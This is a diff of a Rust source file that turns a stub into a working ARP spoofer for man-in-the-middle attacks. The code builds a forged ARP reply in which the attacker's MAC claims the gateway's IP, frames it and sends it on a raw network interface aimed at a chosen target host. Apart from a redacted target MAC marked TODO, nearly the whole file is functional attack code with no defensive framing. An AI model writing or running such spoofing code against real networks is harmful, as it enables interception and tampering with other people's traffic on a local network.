@@ -1,43 +1,91 @@
 use std::net::Ipv4Addr;
 
-use pnet::{packet::{ethernet::{EtherType}, arp::{Arp, ArpHardwareType, ArpOperation}}, util::MacAddr};
+use nix::sys::socket;
+use pnet::{packet::{ethernet::{EtherType, MutableEthernetPacket, EtherTypes}, arp::{Arp, ArpHardwareType, ArpOperation, ArpPacket, MutableArpPacket}, MutablePacket}, util::MacAddr, datalink::{self, NetworkInterface, Channel}};
 
 pub trait ArpSpoofer {
-    fn startForIp(&self, ip: &str);
+    fn spoof_target(&self, ip: Ipv4Addr) -> bool;
+}
+
+pub struct Mitm {
+    pub ipv4: Ipv4Addr,
+    pub hw: MacAddr
 }
 
 pub struct ArpSpooferImpl {
-    spoofed: String
+    interface: NetworkInterface,
+    mitm: Mitm,
+    gateway: Ipv4Addr
 }
 
 impl ArpSpooferImpl {
-    pub fn new(spoofed: &str) -> Self {
+    pub fn new(
+        interface: NetworkInterface,
+        mitm: Mitm, 
+        gateway: Ipv4Addr
+    ) -> Self {
         Self {
-            spoofed: spoofed.to_string()
+            interface: interface,
+            mitm: mitm,
+            gateway: gateway
         }
     }
 }
 
 impl ArpSpoofer for ArpSpooferImpl {
-    fn startForIp(&self, target: &str) {
+    fn spoof_target(&self, target: Ipv4Addr) -> bool {
         // instantiate packet
 
+        println!("Spoofing target: {}", target.to_string());
 
         // TODO: (@objectivecosta) Modify these values
-        let packet = Arp {
-            hardware_type: ArpHardwareType::new(1),
-            protocol_type: EtherType::new(8),
-            hw_addr_len: 10,
-            proto_addr_len: 8,
-            operation: ArpOperation::new(8),
-            sender_hw_addr: MacAddr(8,8,8,8,8,8),
-            sender_proto_addr: Ipv4Addr::new(1, 1, 1, 1),
-            target_hw_addr: MacAddr(8,8,8,8,8,8),
-            target_proto_addr: Ipv4Addr::new(2, 2, 2, 2),
-            payload: vec![]
+        let mut arp_packet_buffer = [0u8; 28];
+        let mut  arp_packet = MutableArpPacket::new(&mut arp_packet_buffer).unwrap();
+        arp_packet.set_hardware_type(ArpHardwareType::new(1)); // Ethernet
+        arp_packet.set_protocol_type(EtherType::new(0x0800)); // IPv4
+        arp_packet.set_hw_addr_len(6);  // ethernet is 6 long
+        arp_packet.set_proto_addr_len(4);  // ipv4s is 4 long
+        arp_packet.set_operation(ArpOperation::new(2));  // 1 is request; 2 is reply.
+        arp_packet.set_sender_hw_addr(self.mitm.hw); 
+        arp_packet.set_sender_proto_addr(self.gateway); 
+        arp_packet.set_target_hw_addr(MacAddr(***REMOVED***)); // TODO: find this information manually
+        arp_packet.set_target_proto_addr(target); 
+
+        let mut ethernet_buffer = [0u8; 42];
+        let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
+
+        ethernet_packet.set_destination(MacAddr::broadcast());
+        ethernet_packet.set_source(self.interface.mac.unwrap());
+        ethernet_packet.set_ethertype(EtherTypes::Arp);
+        ethernet_packet.set_payload(arp_packet.packet_mut());
+
+        println!("Assembled packets!");
+
+        let (mut tx, mut rx) = match datalink::channel(&self.interface, Default::default()) {
+            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
+            Ok(_) => panic!("Unhandled channel type"),
+            Err(e) => panic!("An error occurred when creating the datalink channel: {}", e)
         };
 
-        // TODO: (@objectivecosta) Send packet
-        // no-op
+        println!("Preparing to send packet!");
+
+        let send_opt = tx.send_to(ethernet_packet.packet_mut(), None);
+
+        
+        if let Some(send_res) = send_opt {
+            
+            if let Ok(_) = send_res {
+                println!("Sent packet successfully!");
+                return true
+            } else {
+                println!("Failed on second part!");
+            }
+
+        } else {
+            println!("Failed on first part!");
+        }
+
+
+        return false;
     }
 }
